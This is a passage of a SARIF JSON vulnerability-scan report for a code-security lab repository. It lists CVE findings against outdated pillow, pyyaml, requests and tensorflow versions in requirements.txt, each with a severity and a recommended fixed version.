                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "dc72ff8e6319d912cf05fe9d18fb29a4884d785f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-24303",
          "ruleIndex": 45,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2022-24303 (severity: high, fixed in 9.0.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-24303](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24303)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fada1e1ec91b764ca14bf1e390c00b89dc52b74a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-45198",
          "ruleIndex": 46,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2022-45198 (severity: high, fixed in 9.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-45198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45198)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8d8336090047e05597d49ec3be8e8da0181cf2f1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-44271",
          "ruleIndex": 47,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2023-44271 (severity: high, fixed in 10.0.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-44271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44271)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0112d68bc77d246952c21414cc2815b431ee4897"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-4863",
          "ruleIndex": 48,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2023-4863 (severity: high, fixed in 10.0.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-4863](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4863)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8c70c95a297f1251caf899c86e5046339738b27d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-56pw-mpj4-fxww",
          "ruleIndex": 49,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability GHSA-56pw-mpj4-fxww (severity: high, fixed in 10.0.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [GHSA-56pw-mpj4-fxww](https://github.com/advisories/GHSA-56pw-mpj4-fxww)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7051f383114d7fda0cb322e6886333ad8b39258c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-50447",
          "ruleIndex": 50,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2023-50447 (severity: critical, fixed in 10.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-50447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50447)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1d76e37c5978f5c80d03d4cdb9c61ce9516c9274"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-28219",
          "ruleIndex": 51,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2024-28219 (severity: high, fixed in 10.3.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-28219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28219)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c0ea369de3f2356305a74b72344fb0c5626b1df0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-14343",
          "ruleIndex": 52,
          "level": "error",
          "message": {
            "text": "Package: pyyaml@4.2b1 (direct)\nVulnerability CVE-2020-14343 (severity: critical, fixed in 5.4)\nSmartFix: 5.4 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-14343](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14343)\nSample path: requirements.txt -\u003e pyyaml@4.2b1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pyyaml@4.2b1\n  4.2b1 is vulnerable:\n    critical   CVE-2020-14343       FixVersion= 5.4\n  5.4 is not vulnerable\n\nFix recommendations for package pkg:pypi/pyyaml@4.2b1\n  5.4 is the minimal version with no known vulnerabilities\n  5.4 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 2 versions (nodes) and 1 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 5,
                  "endLine": 5
                }
              },
              "message": {
                "text": "requirements.txt: pyyaml@4.2b1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d4984a4cd08646d547188486e443a2b7820169fb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-32681",
          "ruleIndex": 53,
          "level": "warning",
          "message": {
            "text": "Package: requests@2.19.1 (direct)\nVulnerability CVE-2023-32681 (severity: medium, fixed in 2.31.0)\nSmartFix: 2.32.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-32681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32681)\nSample path: requirements.txt -\u003e requests@2.19.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/requests@2.19.1\n  2.19.1 is vulnerable:\n    medium     CVE-2023-32681       FixVersion= 2.31.0\n    medium     CVE-2024-35195       FixVersion= 2.32.0\n  2.31.0 is vulnerable:\n    medium     CVE-2024-35195       FixVersion= 2.32.0\n  2.32.0 is not vulnerable\n\nFix recommendations for package pkg:pypi/requests@2.19.1\n  2.32.0 is the minimal version with no known vulnerabilities\n  2.32.0 is the maximum version and it has no known vulnerabilities\n  2.19.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 3 versions (nodes) and 3 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 3,
                  "endLine": 3
                }
              },
              "message": {
                "text": "requirements.txt: requests@2.19.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "99350fcd5a723cad0a4dd2b6b3a3446662108d49"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2024-35195",
          "ruleIndex": 54,
          "level": "warning",
          "message": {
            "text": "Package: requests@2.19.1 (direct)\nVulnerability CVE-2024-35195 (severity: medium, fixed in 2.32.0)\nSmartFix: 2.32.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2024-35195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35195)\nSample path: requirements.txt -\u003e requests@2.19.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/requests@2.19.1\n  2.19.1 is vulnerable:\n    medium     CVE-2023-32681       FixVersion= 2.31.0\n    medium     CVE-2024-35195       FixVersion= 2.32.0\n  2.31.0 is vulnerable:\n    medium     CVE-2024-35195       FixVersion= 2.32.0\n  2.32.0 is not vulnerable\n\nFix recommendations for package pkg:pypi/requests@2.19.1\n  2.32.0 is the minimal version with no known vulnerabilities\n  2.32.0 is the maximum version and it has no known vulnerabilities\n  2.19.1 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 3 versions (nodes) and 3 CVEs (edges) (diameter=1)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 3,
                  "endLine": 3
                }
              },
              "message": {
                "text": "requirements.txt: requests@2.19.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3f218bf8321b976dff8b56be8f91216207194478"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2019-16778",
          "ruleIndex": 55,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2019-16778 (severity: low, fixed in 1.15.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2019-16778](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16778)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "27030d819134a00cc198e92e9ebf7caabbe6dd22"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-5215",
          "ruleIndex": 56,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-5215 (severity: low, fixed in 1.15.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-5215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5215)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a2d02a56068004379d3c45eaf219a5b7d42ae0b3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15190",
          "ruleIndex": 57,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15190 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15190](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15190)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b52ac00e9f39f96e33965c321f27ac22a36dfd86"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15209",
          "ruleIndex": 58,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15209 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4f50b0ec033f981adaab6fd52639f26a27e56cc0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15194",
          "ruleIndex": 59,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15194 (severity: medium, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15194)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fe8bb6fbb07e48ce54f593456d54fc8a8ef9b11f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15202",
          "ruleIndex": 60,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15202 (severity: high, fixed in 1.15.4)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15202)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "92bf9d4c8f0aefb1c9bcd97d5ed9abced3739157"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
